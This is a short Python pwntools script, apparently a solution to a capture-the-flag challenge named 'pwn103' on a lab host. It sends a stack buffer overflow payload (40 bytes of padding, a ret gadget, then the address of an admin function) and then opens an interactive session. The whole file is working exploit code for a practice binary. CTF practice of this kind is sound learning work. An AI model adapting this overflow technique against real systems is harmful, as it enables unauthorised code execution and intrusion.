from pwn import *

DEBUG = 1

if DEBUG == 0:
    p = process("./pwn103")

else:
    p = remote("10.10.242.11", 9003)

elf = ELF('./pwn103')
ret_gadget = next(elf.search(asm('ret')))
print(hex(ret_gadget))
admin_addr = 0x401554
#ret_gadget = 0x401016 # ropper -f ./pwn103 --search "ret"
p.recvline(b"Choose the channel: ")  
p.sendline(b"3")
p.recvline(b"[pwner]:")

payload = b'a' * 40
payload += p64(ret_gadget)
payload += p64(admin_addr)

p.sendline(payload)
p.interactive()
